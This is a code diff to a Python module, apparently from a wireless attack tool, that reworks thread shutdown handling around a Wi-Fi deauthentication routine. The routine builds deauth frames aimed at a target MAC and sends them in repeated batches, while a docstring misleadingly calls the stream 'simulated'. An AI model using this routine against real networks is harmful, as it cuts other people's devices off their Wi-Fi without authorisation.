@@ -2,6 +2,8 @@ import threading
 import time
 from collections import deque
 
+from modules.thread_control import get_shutdown_event, start_managed_thread
+
 _STATUS_LINES = deque(maxlen=120)
 _STATUS_LOCK = threading.Lock()
 _WORKER_LOCK = threading.Lock()
@@ -27,6 +29,7 @@ def begin_deauth(ap_mac, target_mac, interface):
             _WORKER_STOP_EVENT.set()
             _WORKER_STARTED = False
         stop_event = threading.Event()
+        shutdown_event = get_shutdown_event()
         _WORKER_STOP_EVENT = stop_event
         _WORKER_STARTED = True
 
@@ -51,7 +54,7 @@ def begin_deauth(ap_mac, target_mac, interface):
             pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
             
             _push_status(f"deauth packet built, entering send loop")
-            while not stop_event.wait(1.0):
+            while not stop_event.wait(1.0) and not shutdown_event.is_set():
                 try:
                     # Send deauth packets continuously
                     _push_status(f"sending 100 deauth packets..")
@@ -73,14 +76,13 @@ def begin_deauth(ap_mac, target_mac, interface):
                 _WORKER_STARTED = False
             _push_status("attack stopped")
 
-    worker = threading.Thread(target=_worker, daemon=True)
+    worker = start_managed_thread("wifi-deauth", _worker, daemon=True)
     with _WORKER_LOCK:
         _WORKER_THREAD = worker
-    worker.start()
-    return True
+    return worker is not None
 
 
-def stop_deauth():
+def stop_deauth(join_timeout=3.0):
     """Stop the simulated deauth status stream."""
     global _WORKER_STARTED
 
@@ -90,10 +92,15 @@ def stop_deauth():
             return False
         _WORKER_STARTED = False
         stop_event = _WORKER_STOP_EVENT
+        worker = _WORKER_THREAD
 
     _push_status("stopping simulation")
     if stop_event is not None:
         stop_event.set()
+
+    if worker is not None and worker.is_alive():
+        worker.join(timeout=max(0.0, float(join_timeout)))
+
     return True
 
 
